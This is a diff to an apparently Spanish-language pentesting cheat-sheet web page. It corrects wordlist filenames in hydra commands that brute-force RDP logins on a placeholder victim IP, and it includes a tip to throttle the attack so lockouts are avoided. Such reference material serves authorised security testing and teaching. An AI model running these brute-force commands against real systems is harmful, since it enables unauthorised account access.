@@ -44,12 +44,12 @@ rdesktop -u &lt;usuario&gt; -p &lt;contraseña&gt; &lt;ip_victima&gt;</code></pr
             <section class="code-card">
               <h3>Fuerza Bruta: hydra</h3>
               <pre><code># Simple
-hydra -L &lt;wordlists_usenames.txt&gt; -p &#x27;password123&#x27; &lt;ip_victima&gt; rdp
+hydra -L &lt;wordlist_usernames.txt&gt; -p &#x27;password123&#x27; &lt;ip_victima&gt; rdp
 
-hydra  -L &lt;wordlists_usenames.txt&gt; -P &lt;wordlists_password.txt&gt; rdp://&lt;ip_victima&gt; -s &lt;port&gt;
+hydra -L &lt;wordlist_usernames.txt&gt; -P &lt;wordlist_passwords.txt&gt; rdp://&lt;ip_victima&gt; -s &lt;port&gt;
 
 # Complejo. Se recomienda usar -t para bajar la velocidad y evitar bloqueos
-hydra -t 4 -V -f -L &lt;wordlists_usenames.txt&gt; -P &lt;wordlists_password.txt&gt; rdp://&lt;ip_victima&gt;</code></pre>
+hydra -t 4 -V -f -L &lt;wordlist_usernames.txt&gt; -P &lt;wordlist_passwords.txt&gt; rdp://&lt;ip_victima&gt;</code></pre>
             </section>
 
             <section class="code-card">
